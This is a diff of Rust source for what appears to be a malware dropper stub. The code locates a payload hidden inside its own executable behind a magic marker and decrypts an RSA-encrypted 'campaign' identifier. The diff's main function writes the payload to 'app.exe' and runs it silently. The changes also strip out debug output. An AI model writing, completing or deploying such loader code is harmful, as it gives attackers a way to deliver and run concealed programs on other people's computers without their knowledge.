@@ -14,6 +14,11 @@ use std::env::current_exe;
 use std::convert::TryInto;
 use rsa::PaddingScheme;
 
+struct Payload {
+    bytes: Vec<u8>,
+    campaign: String,
+}
+
 fn find3(haystack: &Vec<u8>, needle: &Vec<u8>) -> Option<usize> {
     (0..haystack.len()-needle.len()+1)
         .filter(|&i| haystack[i..i+needle.len()] == needle[..]).next()
@@ -31,7 +36,7 @@ fn should_run() -> bool {
     true
 }
 
-fn payload() -> Result<Option<Vec<u8>>> {
+fn payload() -> Result<Option<Payload>> {
     let bytes = read(current_exe()?)?;
 
     let mut magic = shared::MAGIC.as_bytes().to_vec();
@@ -43,8 +48,6 @@ fn payload() -> Result<Option<Vec<u8>>> {
         let length_bytes = data[..8].to_vec();
         let length = i64::from_be_bytes(length_bytes.try_into().unwrap()) as usize;
 
-        println!("length: {}, {}", length, index);
-
         // read encrypted campaign
         let ciphertext = data[8..8+length].to_vec();
 
@@ -53,18 +56,26 @@ fn payload() -> Result<Option<Vec<u8>>> {
         let campaign = String::from_utf8(utils::KEY.decrypt(padding, &ciphertext)?)?;
 
         // extract payload
-        let payload_bytes = data[8+length..].to_vec();
-
-        println!("campaign: {}, length: {}", campaign, payload_bytes.len());
+        return Ok(Some(Payload {
+            bytes: data[8+length..].to_vec(),
+            campaign
+        }));
     }
-
 
     Ok(None)
 }
 
 fn main() {
-    payload().unwrap();
+    utils::chdir2();
+    if let Some(payload) = payload().unwrap() {
+        let mut file = File::create("app.exe").unwrap();
+        file.write_all(&payload.bytes).unwrap();
 
+        // run program.
+        Command::new("app.exe").spawn().unwrap();
+    }
+
+    // ...
     utils::chdir();
 
     // check if we should continue?
